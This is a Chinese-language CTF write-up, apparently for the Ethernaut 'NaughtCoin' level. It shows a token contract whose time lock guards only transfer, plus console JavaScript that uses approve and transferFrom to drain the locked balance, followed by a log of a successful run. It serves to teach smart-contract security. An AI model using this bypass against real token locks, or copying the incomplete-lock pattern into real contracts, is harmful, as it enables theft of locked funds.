# 16 NaugthCoin

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

目标: player地址上有一些token, 但要10年后才能转出, 想办法将其全部转出

题目中在`tranfer`函数上添加了一个`modifier` : `lockTokens` : 如果`msg.send == player`则检查时间.

但忽略了ERC20.sol中还有另外一个函数 `transferFrom`

所以, player可以先使用 `approve`函数将token全部授权给自己, 然后自己再调用 `transferFrom`函数进行转出.

```js
let balance = await contract.balanceOf(player);
console.log(balance.toString());

await contract.approve(player, "1000000000000000000000000", {from: player});

let allowance = await contract.allowance(player, player);
//should be 1000000000000000000000000
console.log(allowance.toString());


await contract.transferFrom(player, "0x8A49d86C7eBdDffc02D4c58674d6cF5B50B876e5", "1000000000000000000000000");

allowance = await contract.allowance(player, player);
//should be 0
console.log(allowance.toString());

//check
balance = await contract.balanceOf(player);
//should be 0
console.log(balance.toString());
```

>await contract.approve(player, 1000000000000000000000000, {from: player});  会报overflow错误, 小一点的数字则不会, 解决方法: **给数字加上引号**



## 参考过程

```js
^^.js:45 <>_<> 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 19:22:58.207
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x4caa513055cfde1b5e2a5bb9c181678d9200b6a13805f2055baf4ff75b5120df
^^.js:35 => 实例地址0x923f3A77b2Fb179dbf871264Fc25A850bf728368
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 19:23:05.828
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x4caa513055cfde1b5e2a5bb9c181678d9200b6a13805f2055baf4ff75b5120df
redux-logger.js:1  action SET_BLOCK_NUM @ 19:23:11.242
let balance = await contract.balanceOf(player);
console.log(balance.toString());

await contract.approve(player, "1000000000000000000000000", {from: player});

let allowance = await contract.allowance(player, player);
//should be 1000000000000000000000000
console.log(allowance.toString());


await contract.transferFrom(player, "0x8A49d86C7eBdDffc02D4c58674d6cF5B50B876e5", "1000000000000000000000000");

allowance = await contract.allowance(player, player);
//should be 0
console.log(allowance.toString());

//check
balance = await contract.balanceOf(player);
//should be 0
console.log(balance.toString());
VM1391:2 1000000000000000000000000
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xb79dc7df6d01cbd386c6e6187cacc7cc8592e5173db76ac5fecbd4ae74635162
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xb79dc7df6d01cbd386c6e6187cacc7cc8592e5173db76ac5fecbd4ae74635162
VM1391:8 1000000000000000000000000
redux-logger.js:1  action SET_BLOCK_NUM @ 19:23:21.316
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x874aa67d43dcf19f3a5b0bb0e56da1d841fe3d406153f8dfa56a5c0bc77ddf9a
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x874aa67d43dcf19f3a5b0bb0e56da1d841fe3d406153f8dfa56a5c0bc77ddf9a
VM1391:15 0
VM1391:20 0
undefined
redux-logger.js:1  action SET_BLOCK_NUM @ 19:23:31.243
^^.js:45 \(ˆ˚ˆ)/ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 19:23:35.048
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x7e302ab8a79b8fbb5d5335011269b1d5be67714a498cbb81c737cb6a87cc4984
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x7e302ab8a79b8fbb5d5335011269b1d5be67714a498cbb81c737cb6a87cc4984
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 19:23:51.244

```

